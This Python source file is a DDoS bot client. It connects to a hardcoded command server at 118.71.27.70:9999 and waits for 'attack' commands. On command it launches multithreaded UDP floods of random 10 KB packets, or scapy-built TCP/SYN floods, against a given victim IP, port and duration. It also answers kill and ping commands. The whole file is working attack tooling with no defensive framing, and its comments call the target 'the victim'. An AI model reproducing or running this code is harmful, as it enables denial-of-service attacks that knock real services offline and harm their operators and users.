from scapy.all import *
from threading import Thread
from time import time, sleep
import socket, signal
import sys, random
from typing import Tuple


class Client():
    run=False
    #118.71.27.70
    def __init__(self, connect:Tuple[str,int]=("118.71.27.70",9999)) -> None:
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
        self.stop = False
        self.run = False
        while not self.stop:
            try:
                self._connect(connect)#connect to server
            except KeyboardInterrupt:
                continue
            except Exception as e: #if the connection has interupt or error, they throw the exception.
                print(f"Error connecting {connect}| Sleep 10 seconds")
                sleep(10)

    def exit_gracefully(self,signum, frame): #Exit the program.
        print("\nExiting....")
        self.stop = True
        self.run = False
        self.sock.close()
        sleep(1)
        sys.exit(0)

    def _connect(self, connect:Tuple[str,int]) -> None: # create socket to connect to victim.
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(connect)
        self.start()

    def __ddos_udp(self,*args):

        def dos(*args): #*args truyền bao nhiêu tham số vào cũng dc
            t1=time()
            host,port=args[1],args[2]

            s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            bytes=random._urandom(10240) #random the size of udp packet .
            s.connect((host, int(port))) #connect to the  victim
            while self.run:
                if not self.run:break
                s.sendto(bytes, (host,int(port))) #send udp packet to the victim.

            s.close()
            print("run time {}".format(time()-t1))
        for n in range(int(args[4])):
            Thread(target = dos,args=[*args]).start() #create a thread to perform of attack.
        sleep(int(args[3]))
        self.run=False
    def __ddos_syn(self,*args):
        def dos(*args):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            local_ip = s.connect(("8.8.8.8", 80))
            destination_IP = args[1]
            destination_port = int(args[2])
            i = 1
            while self.run:
                if not self.run:break
                send(IP(src=local_ip, dst=destination_IP) / TCP(sport=80, dport=destination_port), loop=0,
                     inter=0.0000001)
                print("Packet sent: ", i)
                i = i + 1
        Thread(target=dos, args=[*args]).start()

    def _recv(self):
        return self.sock.recv(1024).decode("ascii").lower() #decode data send from server.

    def start(self):
        while True:
            data = self._recv()
            if "udp" in data:
                #attack udp 27.64.57.85 1000 120 3000
                # attack udp 192.168.1.10 80 120 3000
                data=data.replace("attack ","").split()
                try:
                    proto, ip, port, sec, thread =  data #tge data include the ip, port, protocol, and thread
                    data = proto, ip, int(port), int(sec), int(thread)
                    self.sock.send("done".encode("ascii"))

                except Exception as e:
                    print(e)
                    self.sock.send("invalid command".encode("ascii")) #if the code has exception from sending the data, we will send the "invalid command" back to the server.
                    continue
                self.run = True
                Thread(target=self.__ddos_udp, args=data).start()
            elif "syn" in data:
                #attack syn 27.64.57.85 1000 120 5000
                # attack syn 192.168.1.10 80 120 5000
                data = data.replace("attack ", "").split()
                try:
                    proto, ip, port, sec, thread = data
                    self.sock.send("done".encode("ascii"))
                    # i = 1
                    # while True:
                    #     send(IP(src=local_ip, dst=destination_IP) / TCP(sport=80, dport=destination_port), loop=0,inter=0.0000001)
                    #     print("Packet sent: ",i)
                    #     i = i + 1
                except Exception as e:
                    print(e)
                    self.sock.send("invalid command".encode("ascii"))  # if the code has exception from sending the data, we will send the "invalid command" back to the server.
                    continue
                self.run = True
                Thread(target=self.__ddos_syn, args=data).start()
                 # create a thread to perform ddos attack.
            elif "kill" in data:
                self.run=False
                self.sock.send(str.encode("Server Stopped")) # stop the server.
            elif "ping" in data:
                self.sock.send(str.encode("Pong"))
            else:
                self.sock.send(str.encode("ERROR"))


if __name__ == '__main__':
    Client()
